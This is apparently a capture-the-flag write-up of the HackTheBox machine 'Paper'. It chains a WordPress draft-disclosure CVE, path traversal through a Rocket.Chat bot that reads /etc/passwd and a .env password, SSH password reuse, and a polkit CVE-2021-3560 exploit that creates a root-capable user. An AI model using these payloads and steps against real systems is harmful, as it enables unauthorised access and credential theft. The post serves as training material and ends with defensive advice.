---
toc: true
comments: true
title: HackTheBox - Paper
layout: post
title: HackTheBox - Paper
date: 2024-07-10 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, WordPress, CVE-2019-17671, Rocket.Chat, Polkit, CVE-2021-3560, PrivEsc]    
image: /assets/Posts/Paper/logo.png
---

## Pre
- Paper is a modern, realistic box: a **WordPress** information-disclosure bug leaks a secret, that secret leads to a **Rocket.Chat** workspace with an over-helpful bot, and root falls to a 2021 **polkit** privilege escalation.
- It's a nice change from the "one big CVE" boxes – the win comes from chaining small leaks, much like [Doctor](/posts/hackthebox-doctor/).

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack
```

```shell
$ nmap -Pn -n -p 22,80,443 -T4 -sSCV -A -oN nmap/versions $IP
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) ...)
|_http-title: HTTP Server Test Page powered by CentOS
```

Port 80 is just the default CentOS test page – but the **HTTP response headers** hide the real hint:

```shell
$ curl -sI http://10.10.11.143 | grep -i backend
X-Backend-Server: office.paper
```

A vhost. Add it and browse there:

```shell
$ echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts
```

`http://office.paper` is a **WordPress 5.2.3** blog.

## Phase 2: WordPress secret disclosure (CVE-2019-17671)
WordPress 5.2.3 is vulnerable to **CVE-2019-17671**: an unauthenticated user can view **draft/private** content by abusing the `static` query parameter, which bypasses the normal access check.

```url
http://office.paper/?static=1
```

That renders drafts inline, including a private note from an admin scolding an employee for posting secrets – and pointing at a **hidden Rocket.Chat registration URL**:

```
...secret registration URL of our new employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

We add `chat.office.paper` to `/etc/hosts` too.

> "Unpublished" is not "inaccessible". CVE-2019-17671 is a great reminder that draft data still lives on the server, and access control bugs expose it. Always check for version-specific CVEs once you fingerprint a CMS.
{: .prompt-tip }

## Phase 3: Rocket.Chat bot → foothold
The registration link lets us create an account on the company **Rocket.Chat**. Inside, channels mention a helper bot called **recyclops** that can fetch files for employees. It naively runs file operations relative to a directory, so it's trivially path-traversable:

```
recyclops file ../../../../etc/passwd
recyclops list ../hubot/
```

Listing the bot's own `hubot` directory and reading its `.env` reveals the bot's configured credentials:

```
recyclops file ../hubot/.env
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
```

Those belong to user **dwight**, and they're reused for SSH:

```shell
$ ssh dwight@10.10.11.143
[dwight@paper ~]$ cat user.txt
```

## Phase 4: Privilege Escalation via polkit (CVE-2021-3560)
Running a quick enumeration (or just checking the OS/polkit version) flags this box as vulnerable to **CVE-2021-3560**, a `polkit`/`accountsservice` authentication bypass. The bug lets a local user create a **new privileged (sudo/wheel) user** by racing a `dbus` call to `CreateUser` and killing it at the right moment.

We use the well-known PoC, which loops the timing for us:

```shell
[dwight@paper ~]$ ./poc.sh -u attacker -p attacker123
[!] Username set as : attacker
[+] Attempting to create user...
[+] User created! Try: su attacker  (password: attacker123)
```

The new account lands in the `wheel` group, so it can `sudo` to root:

```shell
[dwight@paper ~]$ su attacker
Password: attacker123
[attacker@paper ~]$ sudo bash
[root@paper ~]# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusions
- Paper is a modern chain of small leaks: a WordPress access-control CVE exposes a private link, an over-trusting chatbot leaks its own `.env`, and password reuse gets us SSH – then polkit hands us root.
- The recurring real-world lesson: **secrets in "hidden" places aren't secure**. Drafts, internal chat, and bot config files are all fair game.
- Defensive notes: patch WordPress promptly, never hard-code creds in bot `.env` files (and sandbox file-fetching bots), and keep polkit/accountsservice patched against CVE-2021-3560.
- Next we pivot fully into Active Directory with [Forest](/posts/hackthebox-forest/).

_Keep hacking_  🙈🙉🙊
